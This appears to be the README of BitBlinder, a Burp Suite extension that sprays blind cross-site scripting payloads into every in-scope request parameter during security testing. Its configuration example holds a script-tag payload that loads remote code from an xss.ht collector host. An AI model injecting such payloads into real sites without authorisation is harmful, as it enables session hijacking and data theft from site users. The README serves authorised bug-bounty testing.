# BitBlinder

**THIS TOOLS IS IN EARLY BETA USE IT ON YOUR OWN RISK**  
Burp extension helps in finding blind xss vulnerabilities by injecting xss payloads in every request passes throw BurpSuite
```
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
-  Developer: Ahmed Ezzat (BitTheByte)      -
-  Github:    https://github.com/BitTheByte -
-  Version:   0.03b                         -
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE
[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY
[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH
```

# Configuration
Currenlty there is no gui window to configure the tool so you'll need to edit the code directly
Edit the current settings in the `.py` file
```python
OP_INJECTION_PAYLOADS_LIST = [
  'your_blind_xss_payload'  # example =>  "><script%20src="https://myusername.xss.ht><script>
]
```


# How to use
1. Load the extension to your burpsuite
2. Add your target to scope **It'll only work for inscope items**
3. Continue your hunting session **Make sure to do alot of actions [Forms,Search,...]**
4. Monitor the output in extension's output tab

**Note:** By the nature of this tool it'll make alot of requests so you may get blocked by WAF or experience slow internet connection


# In a nutshell

When user visits [https://example.com?vuln=123&vuln2=abc](https://example.com?vuln=123&vuln2=abc)  
This tool will generate the following 2 requests (in the background with effecting the current session)  
1. [https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc](https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc)
2. [https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD]](https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD])

The previous example also applies to `POST` parameters


# Current version
```
Version 0.03b
```


# TO-DO (By priority)
- GUI
- Fix endless request loops
- Injection in headers
- Option to exclude paramters/hosts/endpoints
- Better output/logging system
